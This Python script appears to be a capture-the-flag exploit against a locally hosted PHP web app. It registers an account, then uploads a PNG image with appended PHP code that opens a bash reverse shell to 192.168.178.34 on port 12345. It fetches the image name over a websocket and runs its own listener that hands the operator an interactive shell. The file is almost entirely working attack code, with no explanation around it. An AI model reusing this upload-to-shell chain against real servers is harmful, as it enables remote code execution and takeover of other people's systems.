import requests
import json
import random
import string
import png
import websocket
import time
import base64
import urllib.parse
import socket
import selectors
import sys
import threading
import os
import fcntl

class Writer:

	def __init__(self):
		self.b = []

	def write(self,x):
		self.b.append(x)

	def close(self):
		pass

	def get(self):
		return b''.join(self.b)


randstr = lambda x: ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(x)])

host = "127.0.0.1"

cookie_register = "KCcmJTpeIiE2fTRYenl4Ly5SdHNyLygnS21ra2pofkRmZWRieD5fXzo6W3FJWDU0VTIxUlJRZmUrTEtLSklHXSMhRFl8QWloeTw8dlY5N01xNTRJSGxqRWloSEFkYz50JjtxI1xKWkg6WHkxVUIuUixQcSlNb0pKN2tHaURE"
cookie_login = "KCcmJDpeIiF9fDRYenl3NS5SdHNycSgnS21saighRWdmZSJ5P2E8PE06OTg3WTVXVVRTUi9RbGVkY2JLJ0lIR0ZufjJBe1xoPT07dTp0VHI2SzRuIWxrWFdoQmZlZGNicyRNcD5%2BW0hZV1ZEVWZlUVFyKk5M"
cookie_upload = "KCclJTpeIn59fXt6MjFVd3Z0cytPcXBuLCskSGppaGZ8QmQ/UT49XnQ6XDhaWW5tM1VTU1JQZixNKWhKOV8kJCMiRENCai96PlN3dWM5cyZMS1AzTkdMWGhnLCspP2MnJiQjXQ=="

s = requests.Session()

def reset():
	del s.cookies['p']

get = lambda x:[reset(),s.cookies.set('p',x),s.get('http://%s'%(host))][2]
post = lambda x,y:[reset(),s.cookies.set('p',x),s.post('http://%s'%(host),data=y)][2]
post_png= lambda x,y:[reset(),s.cookies.set('p',x),s.post('http://%s'%(host),data=y,headers={'Content-type': 'image/png'})][2]
post_stream = lambda x,y:[reset(),s.cookies.set('p',x),s.post('http://%s'%(host),headers={'Content-Type': 'application/octet-stream'},hooks={'response': y})][2]

register = lambda u,p: post(cookie_register,json.dumps({'username':u,'password':p}))
login = lambda u,p: post(cookie_login,json.dumps({'username':u,'password':p}))

upload = lambda x: post_png(cookie_upload,x)



username = randstr(8)
password = randstr(16)

r = register(username,password)
print(r.text)
r = login(username,password)
print(r.text)

temp = Writer()
wr = png.Writer(1,1)
wr.write(temp,[[0]])

payload = b'''
<?php
set_time_limit(0);
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.178.34/12345 0>&1'");
'''
temp.write(payload)
data = temp.get()

r = upload(data)
print(r.text)


def on_message(ws,msg):
	global pic
	data = json.loads(msg)
	method = data['method']
	data = data['data']
	if method=='your_user':
		if data['pic'] == 'default.png':
			ws.send(json.dumps({'method':'update_img','data':''}))
		else:
			pic = data['pic']
			ws.close()

ws = websocket.WebSocketApp("ws://127.0.0.1:1337", cookie = "PHPSESSID=%s;"%(s.cookies['PHPSESSID']),on_message=on_message)
ws.run_forever()

print("visit https://zb3.me/malbolge-tools/#generator")
print("public/static/img/profile/%s"%(pic))
data = input("result: ").encode()
b = urllib.parse.quote(base64.b64encode(data).decode())

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0',12345))
sock.listen(5)

t = threading.Thread(target=lambda:get(b))
t.start()

(c, addr) = sock.accept()
c.setblocking(False)

print("got connection from: "+str(addr))

selector = selectors.DefaultSelector()
orig_fl = fcntl.fcntl(sys.stdin, fcntl.F_GETFL)
fcntl.fcntl(sys.stdin, fcntl.F_SETFL, orig_fl | os.O_NONBLOCK)

selector.register(sys.stdin, selectors.EVENT_READ, lambda x: c.sendall(x.buffer.read()))
selector.register(c, selectors.EVENT_READ, lambda x: [sys.stdout.buffer.write(x.recv(1024)),sys.stdout.flush()])

while True:
    events = selector.select()
    for key, mask in events:
    	callback = key.data
    	callback(key.fileobj)

selector.unregister(c)
select.unregister(sys.stdin)
c.close()
sock.close()